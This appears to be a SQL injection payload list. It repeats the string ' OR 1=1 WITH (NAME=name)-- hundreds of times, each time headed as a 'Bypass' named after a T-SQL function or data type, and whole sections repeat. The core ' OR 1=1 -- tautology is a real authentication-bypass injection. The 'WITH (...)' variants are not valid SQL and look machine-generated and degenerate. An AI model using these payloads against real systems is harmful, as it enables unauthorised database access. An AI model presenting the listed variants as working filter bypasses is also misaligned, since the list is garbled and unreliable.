 ' OR 1=1 WITH (CHOOSE=choose)--
-
--- TRY_CAST Bypasses
 ' OR 1=1 WITH (TRY_CAST=try_cast)--
-
--- TRY_CONVERT Bypasses
 ' OR 1=1 WITH (TRY_CONVERT=try_convert)--
-
--- TRY_PARSE Bypasses
 ' OR 1=1 WITH (TRY_PARSE=try_parse)--
-
--- PARSE Bypasses
 ' OR 1=1 WITH (PARSE=parse)--
-
--- FORMAT Bypasses
 ' OR 1=1 WITH (FORMAT=format)--
-
--- CONCAT Bypasses
 ' OR 1=1 WITH (CONCAT=concat)--
-
--- CONCAT_WS Bypasses
 ' OR 1=1 WITH (CONCAT_WS=concat_ws)--
-
--- STRING_AGG Bypasses
 ' OR 1=1 WITH (STRING_AGG=string_agg)--
-
--- STRING_SPLIT Bypasses
 ' OR 1=1 WITH (STRING_SPLIT=string_split)--
-
--- STRING_ESCAPE Bypasses
 ' OR 1=1 WITH (STRING_ESCAPE=string_escape)--
-
--- TRANSLATE Bypasses
 ' OR 1=1 WITH (TRANSLATE=translate)--
-
--- TRIM Bypasses
 ' OR 1=1 WITH (TRIM=trim)--
-
--- LTRIM Bypasses
 ' OR 1=1 WITH (LTRIM=ltrim)--
-
--- RTRIM Bypasses
 ' OR 1=1 WITH (RTRIM=rtrim)--
-
--- UPPER Bypasses
 ' OR 1=1 WITH (UPPER=upper)--
-
--- LOWER Bypasses
 ' OR 1=1 WITH (LOWER=lower)--
-
--- REVERSE Bypasses
 ' OR 1=1 WITH (REVERSE=reverse)--
-
--- REPLICATE Bypasses
 ' OR 1=1 WITH (REPLICATE=replicate)--
-
--- SPACE Bypasses
 ' OR 1=1 WITH (SPACE=space)--
-
--- STUFF Bypasses
 ' OR 1=1 WITH (STUFF=stuff)--
-
--- SUBSTRING Bypasses
 ' OR 1=1 WITH (SUBSTRING=substring)--
-
--- LEFT Bypasses
 ' OR 1=1 WITH (LEFT=left)--
-
--- RIGHT Bypasses
 ' OR 1=1 WITH (RIGHT=right)--
-
--- CHARINDEX Bypasses
 ' OR 1=1 WITH (CHARINDEX=charindex)--
-
--- PATINDEX Bypasses
 ' OR 1=1 WITH (PATINDEX=patindex)--
-
--- REPLACE Bypasses
 ' OR 1=1 WITH (REPLACE=replace)--
-
--- STR Bypasses
 ' OR 1=1 WITH (STR=str)--
-
--- ASCII Bypasses
 ' OR 1=1 WITH (ASCII=ascii)--
-
--- UNICODE Bypasses
 ' OR 1=1 WITH (UNICODE=unicode)--
-
--- NCHAR Bypasses
 ' OR 1=1 WITH (NCHAR=nchar)--
-
--- CHAR Bypasses
 ' OR 1=1 WITH (CHAR=char)--
-
--- SOUNDEX Bypasses
 ' OR 1=1 WITH (SOUNDEX=soundex)--
-
--- DIFFERENCE Bypasses
 ' OR 1=1 WITH (DIFFERENCE=difference)--
-
--- QUOTENAME Bypasses
 ' OR 1=1 WITH (QUOTENAME=quotename)--
-
--- PARSENAME Bypasses
 ' OR 1=1 WITH (PARSENAME=parsename)--
-
--- ISNUMERIC Bypasses
 ' OR 1=1 WITH (ISNUMERIC=isnumeric)--
-
--- ISJSON Bypasses
 ' OR 1=1 WITH (ISJSON=isjson)--
-
--- JSON_VALUE Bypasses
 ' OR 1=1 WITH (JSON_VALUE=json_value)--
-
--- JSON_QUERY Bypasses
 ' OR 1=1 WITH (JSON_QUERY=json_query)--
-
--- JSON_MODIFY Bypasses
 ' OR 1=1 WITH (JSON_MODIFY=json_modify)--
-
--- OPENJSON Bypasses
 ' OR 1=1 WITH (OPENJSON=openjson)--
-
--- FOR JSON Bypasses
 ' OR 1=1 WITH (FOR JSON=for_json)--
-
--- JSON_PATH_EXISTS Bypasses
 ' OR 1=1 WITH (JSON_PATH_EXISTS=json_path_exists)--
-
--- JSON_ARRAY Bypasses
 ' OR 1=1 WITH (JSON_ARRAY=json_array)--
-
--- JSON_OBJECT Bypasses
 ' OR 1=1 WITH (JSON_OBJECT=json_object)--
-
--- JSON_ARRAY_AGG Bypasses
 ' OR 1=1 WITH (JSON_ARRAY_AGG=json_array_agg)--
-
--- JSON_OBJECT_AGG Bypasses
 ' OR 1=1 WITH (JSON_OBJECT_AGG=json_object_agg)--
-
--- IS_XML Bypasses
 ' OR 1=1 WITH (IS_XML=is_xml)--
-
--- XML_VALUE Bypasses
 ' OR 1=1 WITH (XML_VALUE=xml_value)--
-
--- XML_QUERY Bypasses
 ' OR 1=1 WITH (XML_QUERY=xml_query)--
-
--- XML_EXIST Bypasses
 ' OR 1=1 WITH (XML_EXIST=xml_exist)--
-
--- XML_MODIFY Bypasses
 ' OR 1=1 WITH (XML_MODIFY=xml_modify)--
-
--- XML_NODES Bypasses
 ' OR 1=1 WITH (XML_NODES=xml_nodes)--
-
--- XML_OPENXML Bypasses
 ' OR 1=1 WITH (XML_OPENXML=xml_openxml)--
-
--- XML_BULKLOAD Bypasses
 ' OR 1=1 WITH (XML_BULKLOAD=xml_bulkload)--
-
--- FOR XML Bypasses
 ' OR 1=1 WITH (FOR XML=for_xml)--
-
--- XML_SCHEMA Bypasses
 ' OR 1=1 WITH (XML_SCHEMA=xml_schema)--
-
--- XML_SCHEMA_NAMESPACE Bypasses
 ' OR 1=1 WITH (XML_SCHEMA_NAMESPACE=xml_schema_namespace)--
-
--- XML_DATATYPE Bypasses
 ' OR 1=1 WITH (XML_DATATYPE=xml_datatype)--
-
--- XML_INDEX Bypasses
 ' OR 1=1 WITH (XML_INDEX=xml_index)--
-
--- XML_VIEW Bypasses
 ' OR 1=1 WITH (XML_VIEW=xml_view)--
-
--- XML_COLLECTION Bypasses
 ' OR 1=1 WITH (XML_COLLECTION=xml_collection)--
-
--- XML_TEMPLATE Bypasses
 ' OR 1=1 WITH (XML_TEMPLATE=xml_template)--
-
--- XML_LOB Bypasses
 ' OR 1=1 WITH (XML_LOB=xml_lob)--
-
--- XML_SCHEMA_COLLECTION Bypasses
 ' OR 1=1 WITH (XML_SCHEMA_COLLECTION=xml_schema_collection)--
-
--- XML_INDEX_VIEW Bypasses
 ' OR 1=1 WITH (XML_INDEX_VIEW=xml_index_view)--
-
--- XML_NAMESPACE Bypasses
 ' OR 1=1 WITH (XML_NAMESPACE=xml_namespace)--
-
--- XML_DATA_TYPE Bypasses
 ' OR 1=1 WITH (XML_DATA_TYPE=xml_data_type)--
-
--- XML_FORMAT Bypasses
 ' OR 1=1 WITH (XML_FORMAT=xml_format)--
-
--- XML_STORAGE Bypasses
 ' OR 1=1 WITH (XML_STORAGE=xml_storage)--
-
--- XML_PROCESSING Bypasses
 ' OR 1=1 WITH (XML_PROCESSING=xml_processing)--
-
--- XML_VALIDATION Bypasses
 ' OR 1=1 WITH (XML_VALIDATION=xml_validation)--
-
--- XML_SERIALIZATION Bypasses
 ' OR 1=1 WITH (XML_SERIALIZATION=xml_serialization)--
-
--- XML_COMPRESSION Bypasses
 ' OR 1=1 WITH (XML_COMPRESSION=xml_compression)--
-
--- XML_ENCRYPTION Bypasses
 ' OR 1=1 WITH (XML_ENCRYPTION=xml_encryption)--
-
--- XML_SIGNATURE Bypasses
 ' OR 1=1 WITH (XML_SIGNATURE=xml_signature)--
-
--- XML_TRANSFORM Bypasses
 ' OR 1=1 WITH (XML_TRANSFORM=xml_transform)--
-
--- XML_QUERY Bypasses
 ' OR 1=1 WITH (XML_QUERY=xml_query)--
-
--- XML_VALUE Bypasses
 ' OR 1=1 WITH (XML_VALUE=xml_value)--
-
--- XML_EXIST Bypasses
 ' OR 1=1 WITH (XML_EXIST=xml_exist)--
-
--- XML_MODIFY Bypasses
 ' OR 1=1 WITH (XML_MODIFY=xml_modify)--
-
--- XML_NODES Bypasses
 ' OR 1=1 WITH (XML_NODES=xml_nodes)--
-
--- XML_OPENXML Bypasses
 ' OR 1=1 WITH (XML_OPENXML=xml_openxml)--
-
--- XML_BULKLOAD Bypasses
 ' OR 1=1 WITH (XML_BULKLOAD=xml_bulkload)--
-
--- XML_FOR Bypasses
 ' OR 1=1 WITH (XML_FOR=xml_for)--
-
--- XML_AUTO Bypasses
 ' OR 1=1 WITH (XML_AUTO=xml_auto)--
-
--- XML_EXPLICIT Bypasses
 ' OR 1=1 WITH (XML_EXPLICIT=xml_explicit)--
-
--- XML_RAW Bypasses
 ' OR 1=1 WITH (XML_RAW=xml_raw)--
-
--- XML_PATH Bypasses
 ' OR 1=1 WITH (XML_PATH=xml_path)--
-
--- XML_ELEMENTS Bypasses
 ' OR 1=1 WITH (XML_ELEMENTS=xml_elements)--
-
--- XML_BINARY_BASE64 Bypasses
 ' OR 1=1 WITH (XML_BINARY_BASE64=xml_binary_base64)--
-
--- XML_TYPE Bypasses
 ' OR 1=1 WITH (XML_TYPE=xml_type)--
-
--- XMLSCHEMA Bypasses
 ' OR 1=1 WITH (XMLSCHEMA=xmlschema)--
-
--- XMLDATA Bypasses
 ' OR 1=1 WITH (XMLDATA=xmldata)--
-
--- XMLNAMESPACES Bypasses
 ' OR 1=1 WITH (XMLNAMESPACES=xmlnamespaces)--
-
--- XSINIL Bypasses
 ' OR 1=1 WITH (XSINIL=xsinil)--
-
--- ROOT Bypasses
 ' OR 1=1 WITH (ROOT=root)--
-
--- BINARY_BASE64 Bypasses
 ' OR 1=1 WITH (BINARY_BASE64=binary_base64)--
-
--- TRUNCATE_YEAR Bypasses
 ' OR 1=1 WITH (TRUNCATE_YEAR=truncate_year)--
-
--- FORMAT Bypasses
 ' OR 1=1 WITH (FORMAT=format)--
-
--- DATE_FORMAT Bypasses
 ' OR 1=1 WITH (DATE_FORMAT=date_format)--
-
--- TIME_FORMAT Bypasses
 ' OR 1=1 WITH (TIME_FORMAT=time_format)--
-
--- DATETIME_FORMAT Bypasses
 ' OR 1=1 WITH (DATETIME_FORMAT=datetime_format)--
-
--- TIMESTAMP_FORMAT Bypasses
 ' OR 1=1 WITH (TIMESTAMP_FORMAT=timestamp_format)--
-
--- DECIMAL Bypasses
 ' OR 1=1 WITH (DECIMAL=decimal)--
-
--- FLOAT Bypasses
 ' OR 1=1 WITH (FLOAT=float)--
-
--- REAL Bypasses
 ' OR 1=1 WITH (REAL=real)--
-
--- MONEY Bypasses
 ' OR 1=1 WITH (MONEY=money)--
-
--- SMALLMONEY Bypasses
 ' OR 1=1 WITH (SMALLMONEY=smallmoney)--
-
--- NUMERIC Bypasses
 ' OR 1=1 WITH (NUMERIC=numeric)--
-
--- SMALLINT Bypasses
 ' OR 1=1 WITH (SMALLINT=smallint)--
-
--- TINYINT Bypasses
 ' OR 1=1 WITH (TINYINT=tinyint)--
-
--- BIT Bypasses
 ' OR 1=1 WITH (BIT=bit)--
-
--- BIGINT Bypasses
 ' OR 1=1 WITH (BIGINT=bigint)--
-
--- INT Bypasses
 ' OR 1=1 WITH (INT=int)--
-
--- CHAR Bypasses
 ' OR 1=1 WITH (CHAR=char)--
-
--- VARCHAR Bypasses
 ' OR 1=1 WITH (VARCHAR=varchar)--
-
--- TEXT Bypasses
 ' OR 1=1 WITH (TEXT=text)--
-
--- NCHAR Bypasses
 ' OR 1=1 WITH (NCHAR=nchar)--
-
--- NVARCHAR Bypasses
 ' OR 1=1 WITH (NVARCHAR=nvarchar)--
-
--- NTEXT Bypasses
 ' OR 1=1 WITH (NTEXT=ntext)--
-
--- BINARY Bypasses
 ' OR 1=1 WITH (BINARY=binary)--
-
--- VARBINARY Bypasses
 ' OR 1=1 WITH (VARBINARY=varbinary)--
-
--- IMAGE Bypasses
 ' OR 1=1 WITH (IMAGE=image)--
-
--- UNIQUEIDENTIFIER Bypasses
 ' OR 1=1 WITH (UNIQUEIDENTIFIER=uniqueidentifier)--
-
--- SQL_VARIANT Bypasses
 ' OR 1=1 WITH (SQL_VARIANT=sql_variant)--
-
--- TABLE Bypasses
 ' OR 1=1 WITH (TABLE=table)--
-
--- CURSOR Bypasses
 ' OR 1=1 WITH (CURSOR=cursor)--
-
--- TIMESTAMP Bypasses
 ' OR 1=1 WITH (TIMESTAMP=timestamp)--
-
--- HIERARCHYID Bypasses
 ' OR 1=1 WITH (HIERARCHYID=hierarchyid)--
-
--- GEOMETRY Bypasses
 ' OR 1=1 WITH (GEOMETRY=geometry)--
-
--- GEOGRAPHY Bypasses
 ' OR 1=1 WITH (GEOGRAPHY=geography)--
-
--- DATETIME Bypasses
 ' OR 1=1 WITH (DATETIME=datetime)--
-
--- SMALLDATETIME Bypasses
 ' OR 1=1 WITH (SMALLDATETIME=smalldatetime)--
-
--- DATETIME2 Bypasses
 ' OR 1=1 WITH (DATETIME2=datetime2)--
-
--- DATETIMEOFFSET Bypasses
 ' OR 1=1 WITH (DATETIMEOFFSET=datetimeoffset)--
-
--- DATE Bypasses
 ' OR 1=1 WITH (DATE=date)--
-
--- TIME Bypasses
 ' OR 1=1 WITH (TIME=time)--
-
--- DATETRUNC Bypasses
 ' OR 1=1 WITH (DATETRUNC=datetrunc)--
-
--- EOMONTH Bypasses
 ' OR 1=1 WITH (EOMONTH=eomonth)--
-
--- SWITCHOFFSET Bypasses
 ' OR 1=1 WITH (SWITCHOFFSET=switchoffset)--
-
--- TODATETIMEOFFSET Bypasses
 ' OR 1=1 WITH (TODATETIMEOFFSET=todatetimeoffset)--
-
--- AT TIME ZONE Bypasses
 ' OR 1=1 WITH (AT TIME ZONE=at_time_zone)--
-
--- ISDATE Bypasses
 ' OR 1=1 WITH (ISDATE=isdate)--
-
--- DAY Bypasses
 ' OR 1=1 WITH (DAY=day)--
-
--- MONTH Bypasses
 ' OR 1=1 WITH (MONTH=month)--
-
--- YEAR Bypasses
 ' OR 1=1 WITH (YEAR=year)--
-
--- DATENAME Bypasses
 ' OR 1=1 WITH (DATENAME=datename)--
-
--- DATEPART Bypasses
 ' OR 1=1 WITH (DATEPART=datepart)--
-
--- GETDATE Bypasses
 ' OR 1=1 WITH (GETDATE=getdate)--
-
--- GETUTCDATE Bypasses
 ' OR 1=1 WITH (GETUTCDATE=getutcdate)--
-
--- SYSDATETIME Bypasses
 ' OR 1=1 WITH (SYSDATETIME=sysdatetime)--
-
--- SYSUTCDATETIME Bypasses
 ' OR 1=1 WITH (SYSUTCDATETIME=sysutcdatetime)--
-
--- SYSDATETIMEOFFSET Bypasses
 ' OR 1=1 WITH (SYSDATETIMEOFFSET=sysdatetimeoffset)--
-
--- CURRENT_TIMESTAMP Bypasses
 ' OR 1=1 WITH (CURRENT_TIMESTAMP=current_timestamp)--
-
--- CURRENT_TIMEZONE Bypasses
 ' OR 1=1 WITH (CURRENT_TIMEZONE=current_timezone)--
-
--- DATEDIFF Bypasses
 ' OR 1=1 WITH (DATEDIFF=datediff)--
-
--- DATEADD Bypasses
 ' OR 1=1 WITH (DATEADD=dateadd)--
-
--- ISNULL Bypasses
 ' OR 1=1 WITH (ISNULL=isnull)--
-
--- NULLIF Bypasses
 ' OR 1=1 WITH (NULLIF=nullif)--
-
--- COALESCE Bypasses
 ' OR 1=1 WITH (COALESCE=coalesce)--
-
--- IIF Bypasses
 ' OR 1=1 WITH (IIF=iif)--
-
--- CHOOSE Bypasses
 ' OR 1=1 WITH (CHOOSE=choose)--
-
--- TRY_CAST Bypasses
 ' OR 1=1 WITH (TRY_CAST=try_cast)--
-
--- TRY_CONVERT Bypasses
 ' OR 1=1 WITH (TRY_CONVERT=try_convert)--
-
--- TRY_PARSE Bypasses
 ' OR 1=1 WITH (TRY_PARSE=try_parse)--
-
--- PARSE Bypasses
 ' OR 1=1 WITH (PARSE=parse)--
-
--- FORMAT Bypasses
 ' OR 1=1 WITH (FORMAT=format)--
-
--- CONCAT Bypasses
 ' OR 1=1 WITH (CONCAT=concat)--
-
--- CONCAT_WS Bypasses
 ' OR 1=1 WITH (CONCAT_WS=concat_ws)--
-
--- STRING_AGG Bypasses
 ' OR 1=1 WITH (STRING_AGG=string_agg)--
-
--- STRING_SPLIT Bypasses
 ' OR 1=1 WITH (STRING_SPLIT=string_split)--
-
--- STRING_ESCAPE Bypasses
 ' OR 1=1 WITH (STRING_ESCAPE=string_escape)--
-
--- TRANSLATE Bypasses
 ' OR 1=1 WITH (TRANSLATE=translate)--
-
--- TRIM Bypasses
 ' OR 1=1 WITH (TRIM=trim)--
-
--- LTRIM Bypasses
 ' OR 1=1 WITH (LTRIM=ltrim)--
-
--- RTRIM Bypasses
 ' OR 1=1 WITH (RTRIM=rtrim)--
-
--- UPPER Bypasses
 ' OR 1=1 WITH (UPPER=upper)--
-
--- LOWER Bypasses
 ' OR 1=1 WITH (LOWER=lower)--
-
--- REVERSE Bypasses
 ' OR 1=1 WITH (REVERSE=reverse)--
-
--- REPLICATE Bypasses
 ' OR 1=1 WITH (REPLICATE=replicate)--
-
--- SPACE Bypasses
 ' OR 1=1 WITH (SPACE=space)--
-
--- STUFF Bypasses
 ' OR 1=1 WITH (STUFF=stuff)--
-
--- SUBSTRING Bypasses
 ' OR 1=1 WITH (SUBSTRING=substring)--
-
--- LEFT Bypasses
 ' OR 1=1 WITH (LEFT=left)--
-
--- RIGHT Bypasses
 ' OR 1=1 WITH (RIGHT=right)--
-
--- CHARINDEX Bypasses
 ' OR 1=1 WITH (CHARINDEX=charindex)--
-
--- PATINDEX Bypasses
 ' OR 1=1 WITH (PATINDEX=patindex)--
-
--- REPLACE Bypasses
 ' OR 1=1 WITH (REPLACE=replace)--
-
--- STR Bypasses
 ' OR 1=1 WITH (STR=str)--
-
--- ASCII Bypasses
 ' OR 1=1 WITH (ASCII=ascii)--
-
--- UNICODE Bypasses
 ' OR 1=1 WITH (UNICODE=unicode)--
-
--- NCHAR Bypasses
 ' OR 1=1 WITH (NCHAR=nchar)--
-
--- CHAR Bypasses
 ' OR 1=1 WITH (CHAR=char)--
-
--- SOUNDEX Bypasses
 ' OR 1=1 WITH (SOUNDEX=soundex)--
-
--- DIFFERENCE Bypasses
 ' OR 1=1 WITH (DIFFERENCE=difference)--
-
--- QUOTENAME Bypasses
 ' OR 1=1 WITH (QUOTENAME=quotename)--
-
--- PARSENAME Bypasses
 ' OR 1=1 WITH (PARSENAME=parsename)--
-
--- ISNUMERIC Bypasses
 ' OR 1=1 WITH (ISNUMERIC=isnumeric)--
-
--- ISJSON Bypasses
 ' OR 1=1 WITH (ISJSON=isjson)--
-
--- JSON_VALUE Bypasses
 ' OR 1=1 WITH (JSON_VALUE=json_value)--
-
--- JSON_QUERY Bypasses
 ' OR 1=1 WITH (JSON_QUERY=json_query)--
-
--- JSON_MODIFY Bypasses
 ' OR 1=1 WITH (JSON_MODIFY=json_modify)--
-
--- OPENJSON Bypasses
 ' OR 1=1 WITH (OPENJSON=openjson)--
-
--- FOR JSON Bypasses
 ' OR 1=1 WITH (FOR JSON=for_json)--
-
--- JSON_PATH_EXISTS Bypasses
 ' OR 1=1 WITH (JSON_PATH_EXISTS=json_path_exists)--
-
--- JSON_ARRAY Bypasses
 ' OR 1=1 WITH (JSON_ARRAY=json_array)--
-
--- JSON_OBJECT Bypasses
 ' OR 1=1 WITH (JSON_OBJECT=json_object)--
-
--- JSON_ARRAY_AGG Bypasses
 ' OR 1=1 WITH (JSON_ARRAY_AGG=json_array_agg)--
-
--- JSON_OBJECT_AGG Bypasses
 ' OR 1=1 WITH (JSON_OBJECT_AGG=json_object_agg)--
-
--- IS_XML Bypasses
 ' OR 1=1 WITH (IS_XML=is_xml)--
-
--- XML_VALUE Bypasses
 ' OR 1=1 WITH (XML_VALUE=xml_value)--
-
--- XML_QUERY Bypasses
 ' OR 1=1 WITH (XML_QUERY=xml_query)--
-
--- XML_EXIST Bypasses
 ' OR 1=1 WITH (XML_EXIST=xml_exist)--
-
--- XML_MODIFY Bypasses
 ' OR 1=1 WITH (XML_MODIFY=xml_modify)--
-
--- XML_NODES Bypasses
 ' OR 1=1 WITH (XML_NODES=xml_nodes)--
-
--- XML_OPENXML Bypasses
 ' OR 1=1 WITH (XML_OPENXML=xml_openxml)--
-
--- XML_BULKLOAD Bypasses
 ' OR 1=1 WITH (XML_BULKLOAD=xml_bulkload)--
-
--- FOR XML Bypasses
 ' OR 1=1 WITH (FOR XML=for_xml)--
-
--- XML_SCHEMA Bypasses
 ' OR 1=1 WITH (XML_SCHEMA=xml_schema)--
-
--- XML_SCHEMA_NAMESPACE Bypasses
 ' OR 1=1 WITH (XML_SCHEMA_NAMESPACE=xml_schema_namespace)--
-
--- XML_DATATYPE Bypasses
 ' OR 1=1 WITH (XML_DATATYPE=xml_datatype)--
-
--- XML_INDEX Bypasses
 ' OR 1=1 WITH (XML_INDEX=xml_index)--
-
--- XML_VIEW Bypasses
 ' OR 1=1 WITH (XML_VIEW=xml_view)--
-
--- XML_COLLECTION Bypasses
 ' OR 1=1 WITH (XML_COLLECTION=xml_collection)--
-
--- XML_TEMPLATE Bypasses
 ' OR 1=1 WITH (XML_TEMPLATE=xml_template)--
-
--- XML_LOB Bypasses
 ' OR 1=1 WITH (XML_LOB=xml_lob)--
-
--- XML_SCHEMA_COLLECTION Bypasses
 ' OR 1=1 WITH (XML_SCHEMA_COLLECTION=xml_schema_collection)--
-
--- XML_INDEX_VIEW Bypasses
 ' OR 1=1 WITH (XML_INDEX_VIEW=xml_index_view)--
-
--- XML_NAMESPACE Bypasses
 ' OR 1=1 WITH (XML_NAMESPACE=xml_namespace)--
-
--- XML_DATA_TYPE Bypasses
 ' OR 1=1 WITH (XML_DATA_TYPE=xml_data_type)--
-
--- XML_FORMAT Bypasses
 ' OR 1=1 WITH (XML_FORMAT=xml_format)--
-
--- XML_STORAGE Bypasses
 ' OR 1=1 WITH (XML_STORAGE=xml_storage)--
-
--- XML_PROCESSING Bypasses
 ' OR 1=1 WITH (XML_PROCESSING=xml_processing)--
-
--- XML_VALIDATION Bypasses
 ' OR 1=1 WITH (XML_VALIDATION=xml_validation)--
-
--- XML_SERIALIZATION Bypasses
 ' OR 1=1 WITH (XML_SERIALIZATION=xml_serialization)--
-
--- XML_COMPRESSION Bypasses
 ' OR 1=1 WITH (XML_COMPRESSION=xml_compression)--
-
--- XML_ENCRYPTION Bypasses
 ' OR 1=1 WITH (XML_ENCRYPTION=xml_encryption)--
-
--- XML_SIGNATURE Bypasses
 ' OR 1=1 WITH (XML_SIGNATURE=xml_signature)--
-
--- XML_TRANSFORM Bypasses
 ' OR 1=1 WITH (XML_TRANSFORM=xml_transform)--
-
--- XML_QUERY Bypasses
 ' OR 1=1 WITH (XML_QUERY=xml_query)--
-
--- XML_VALUE Bypasses
 ' OR 1=1 WITH (XML_VALUE=xml_value)--
-
--- XML_EXIST Bypasses
 ' OR 1=1 WITH (XML_EXIST=xml_exist)--
-
--- XML_MODIFY Bypasses
 ' OR 1=1 WITH (XML_MODIFY=xml_modify)--
-
--- XML_NODES Bypasses
 ' OR 1=1 WITH (XML_NODES=xml_nodes)--
-
--- XML_OPENXML Bypasses
 ' OR 1=1 WITH (XML_OPENXML=xml_openxml)--
-
--- XML_BULKLOAD Bypasses
 ' OR 1=1 WITH (XML_BULKLOAD=xml_bulkload)--
-
--- XML_FOR Bypasses
 ' OR 1=1 WITH (XML_FOR=xml_for)--
-
--- XML_AUTO Bypasses
 ' OR 1=1 WITH (XML_AUTO=xml_auto)--
-
--- XML_EXPLICIT Bypasses
 ' OR 1=1 WITH (XML_EXPLICIT=xml_explicit)--
-
--- XML_RAW Bypasses
 ' OR 1=1 WITH (XML_RAW=xml_raw)--
-
--- XML_PATH Bypasses
 ' OR 1=1 WITH (XML_PATH=xml_path)--
-
--- XML_ELEMENTS Bypasses
 ' OR 1=1 WITH (XML_ELEMENTS=xml_elements)--
-
--- XML_BINARY_BASE64 Bypasses
 ' OR 1=1 WITH (XML_BINARY_BASE64=xml_binary_base64)--
-
--- XML_TYPE Bypasses
 ' OR 1=1 WITH (XML_TYPE=xml_type)--
-
--- XMLSCHEMA Bypasses
 ' OR 1=1 WITH (XMLSCHEMA=xmlschema)--
-
--- XMLDATA Bypasses
 ' OR 1=1 WITH (XMLDATA=xmldata)--
-
--- XMLNAMESPACES Bypasses
 ' OR 1=1 WITH (XMLNAMESPACES=xmlnamespaces)--
-
--- XSINIL Bypasses
 ' OR 1=1 WITH (XSINIL=xsinil)--
-
--- ROOT Bypasses
 ' OR 1=1 WITH (ROOT=root)--
-
--- BINARY_BASE64 Bypasses
 ' OR 1=1 WITH (BINARY_BASE64=binary_base64)--
-
--- TRUNCATE_YEAR Bypasses
 ' OR 1=1 WITH (TRUNCATE_YEAR=truncate_year)--
-
--- FORMAT Bypasses
 ' OR 1=1 WITH (FORMAT=format)--
-
--- DATE_FORMAT Bypasses
 ' OR 1=1 WITH (DATE_FORMAT=date_format)--
-
--- TIME_FORMAT Bypasses
 ' OR 1=1 WITH (TIME_FORMAT=time_format)--
-
--- DATETIME_FORMAT Bypasses
 ' OR 1=1 WITH (DATETIME_FORMAT=datetime_format)--
-
--- TIMESTAMP_FORMAT Bypasses
 ' OR 1=1 WITH (TIMESTAMP_FORMAT=timestamp_format)--
-
--- DECIMAL Bypasses
 ' OR 1=1 WITH (DECIMAL=decimal)--
-
--- FLOAT Bypasses
 ' OR 1=1 WITH (FLOAT=float)--
-
--- REAL Bypasses
 ' OR 1=1 WITH (REAL=real)--
-
--- MONEY Bypasses
 ' OR 1=1 WITH (MONEY=money)--
-
--- SMALLMONEY Bypasses
 ' OR 1=1 WITH (SMALLMONEY=smallmoney)--
-
--- NUMERIC Bypasses
 ' OR 1=1 WITH (NUMERIC=numeric)--
-
--- SMALLINT Bypasses
 ' OR 1=1 WITH (SMALLINT=smallint)--
-
--- TINYINT Bypasses
 ' OR 1=1 WITH (TINYINT=tinyint)--
-
--- BIT Bypasses
 ' OR 1=1 WITH (BIT=bit)--
-
--- BIGINT Bypasses
 ' OR 1=1 WITH (BIGINT=bigint)--
-
--- INT Bypasses
 ' OR 1=1 WITH (INT=int)--
-
--- CHAR Bypasses
 ' OR 1=1 WITH (CHAR=char)--
-
--- VARCHAR Bypasses
 ' OR 1=1 WITH (VARCHAR=varchar)--
-
--- TEXT Bypasses
 ' OR 1=1 WITH (TEXT=text)--
-
--- NCHAR Bypasses
 ' OR 1=1 WITH (NCHAR=nchar)--
-
--- NVARCHAR Bypasses
 ' OR 1=1 WITH (NVARCHAR=nvarchar)--
-
--- NTEXT Bypasses
 ' OR 1=1 WITH (NTEXT=ntext)--
-
--- BINARY Bypasses
 ' OR 1=1 WITH (BINARY=binary)--
-
--- VARBINARY Bypasses
 ' OR 1=1 WITH (VARBINARY=varbinary)--
-
--- IMAGE Bypasses
 ' OR 1=1 WITH (IMAGE=image)--
-
--- UNIQUEIDENTIFIER Bypasses
 ' OR 1=1 WITH (UNIQUEIDENTIFIER=uniqueidentifier)--
-
--- SQL_VARIANT Bypasses
 ' OR 1=1 WITH (SQL_VARIANT=sql_variant)--
-
--- TABLE Bypasses
 ' OR 1=1 WITH (TABLE=table)--
-
--- CURSOR Bypasses
 ' OR 1=1 WITH (CURSOR=cursor)--
-
--- TIMESTAMP Bypasses
 ' OR 1=1 WITH (TIMESTAMP=timestamp)--
-
--- HIERARCHYID Bypasses
 ' OR 1=1 WITH (HIERARCHYID=hierarchyid)--
-
--- GEOMETRY Bypasses
 ' OR 1=1 WITH (GEOMETRY=geometry)--
-
--- GEOGRAPHY Bypasses
 ' OR 1=1 WITH (GEOGRAPHY=geography)--
-
--- DATETIME Bypasses
 ' OR 1=1 WITH (DATETIME=datetime)--
-
--- SMALLDATETIME Bypasses
 ' OR 1=1 WITH (SMALLDATETIME=smalldatetime)--
-
--- DATETIME2 Bypasses
 ' OR 1=1 WITH (DATETIME2=datetime2)--
-
--- DATETIMEOFFSET Bypasses
 ' OR 1=1 WITH (DATETIMEOFFSET=datetimeoffset)--
-
--- DATE Bypasses
 ' OR 1=1 WITH (DATE=date)--
-
--- TIME Bypasses
 ' OR 1=1 WITH (TIME=time)--
-
--- DATETRUNC Bypasses
 ' OR 1=1 WITH (DATETRUNC=datetrunc)--
-
--- EOMONTH Bypasses
 ' OR 1=1 WITH (EOMONTH=eomonth)--
-
--- SWITCHOFFSET Bypasses
 ' OR 1=1 WITH (SWITCHOFFSET=switchoffset)--
-
--- TODATETIMEOFFSET Bypasses
 ' OR 1=1 WITH (TODATETIMEOFFSET=todatetimeoffset)--
-
--- AT TIME ZONE Bypasses
 ' OR 1=1 WITH (AT TIME ZONE=at_time_zone)--
-
--- ISDATE Bypasses
 ' OR 1=1 WITH (ISDATE=isdate)--
-
--- DAY Bypasses
 ' OR 1=1 WITH (DAY=day)--
-
--- MONTH Bypasses
 ' OR 1=1 WITH (MONTH=month)--
-
--- YEAR Bypasses
 ' OR 1=1 WITH (YEAR=year)--
-
--- DATENAME Bypasses
 ' OR 1=1 WITH (DATENAME=datename)--
-
--- DATEPART Bypasses
 ' OR 1=1 WITH (DATEPART=datepart)--
-
--- GETDATE Bypasses
 ' OR 1=1 WITH (GETDATE=getdate)--
-
--- GETUTCDATE Bypasses
 ' OR 1=1 WITH (GETUTCDATE=getutcdate)--
-
--- SYSDATETIME Bypasses
 ' OR 1=1 WITH (SYSDATETIME=sysdatetime)--
-
--- SYSUTCDATETIME Bypasses
 ' OR 1=1 WITH (SYSUTCDATETIME=sysutcdatetime)--
-
--- SYSDATETIMEOFFSET Bypasses
 ' OR 1=1 WITH (SYSDATETIMEOFFSET=sysdatetimeoffset)--
-
--- CURRENT_TIMESTAMP Bypasses
 ' OR 1=1 WITH (CURRENT_TIMESTAMP=current_timestamp)--
-
--- CURRENT_TIMEZONE Bypasses
 ' OR 1=1 WITH (CURRENT_TIMEZONE=current_timezone)--
-
--- DATEDIFF Bypasses
 ' OR 1=1 WITH (DATEDIFF=datediff)--
-
--- DATEADD Bypasses
 ' OR 1=1 WITH (DATEADD=dateadd)--
-
--- ISNULL Bypasses
 ' OR 1=1 WITH (ISNULL=isnull)--
-
